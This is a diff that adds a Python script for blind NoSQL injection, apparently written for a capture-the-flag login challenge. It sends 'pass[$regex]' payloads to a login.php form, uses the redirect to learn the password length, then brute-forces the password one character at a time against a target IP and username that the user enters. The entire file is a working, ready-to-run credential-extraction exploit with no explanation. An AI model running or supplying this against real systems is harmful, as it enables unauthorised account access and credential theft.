@@ -1,0 +1,66 @@
+import requests
+import string
+
+GREEN = "\033[92m"
+RED = "\033[91m"
+RESET = "\033[0m"
+
+def get_charset(option):
+    if option == "digits":
+        return string.digits
+    elif option == "letters":
+        return string.ascii_lowercase
+    elif option == "both":
+        return string.ascii_lowercase + string.digits
+    else:
+        raise ValueError(f"{RED}[-] Invalid charset option. Choose from: digits, letters, both.{RESET}")
+
+def send_payload(ip, username, regex):
+    url = f"http://{ip}/login.php"
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0",
+        "Origin": f"http://{ip}",
+        "Referer": f"http://{ip}/?err=1"
+    }
+    data = {
+        "user": username,
+        "pass[$regex]": regex,
+        "remember": "on"
+    }
+    response = requests.post(url, headers=headers, data=data, allow_redirects=False)
+    return response.headers.get("Location", "")
+
+def find_length(ip, username):
+    print(f"[*] Finding password length...")
+    for length in range(1, 21):
+        regex = f"^.{{{length}}}$"
+        location = send_payload(ip, username, regex)
+        if location == "/sekr3tPl4ce.php":
+            print(f"{GREEN}[+] Password length identified: {length}{RESET}")
+            return length
+    raise Exception(f"{RED}[-] Could not determine password length.{RESET}")
+
+def brute_force_password(ip, username, length, charset):
+    print(f"[*] Brute-forcing password characters...")
+    password = ""
+    for i in range(length):
+        for char in charset:
+            attempt = password + char + "." * (length - len(password) - 1)
+            regex = f"^{attempt}$"
+            location = send_payload(ip, username, regex)
+            if location == "/sekr3tPl4ce.php":
+                password += char
+                print(f"{GREEN}[+] Found character {i+1}: {char}{RESET}")
+                break
+    return password
+
+if __name__ == "__main__":
+    ip = input("Enter target IP: ").strip()
+    username = input("Enter username: ").strip()
+    charset_option = input("Character set? (digits / letters / both): ").strip().lower()
+
+    charset = get_charset(charset_option)
+    length = find_length(ip, username)
+    password = brute_force_password(ip, username, length, charset)
+    print(f"{GREEN}[✓] Recovered password: {password}{RESET}")
